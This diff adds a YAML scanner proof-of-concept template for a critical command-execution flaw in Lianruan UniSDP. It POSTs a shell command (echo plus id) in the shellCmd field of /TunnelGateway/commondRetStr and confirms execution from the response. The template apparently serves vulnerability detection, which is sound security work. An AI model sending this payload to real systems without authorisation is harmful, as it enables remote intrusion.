@@ -1,0 +1,19 @@
+id: poc-yaml-lr-UniSDP-commondRetStr-rce
+info:
+  name: 联软UniSDP commondRetStr命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: UniSDP 软件定义边界系统
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /TunnelGateway/commondRetStr
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: shellCmd=echo {{.t2}};id
+  expression: status_code == 200 && contains(body,t2) && contains(body,"\"msg\":\"success\"")
+    && contains(body,"uid=")
+transport: http
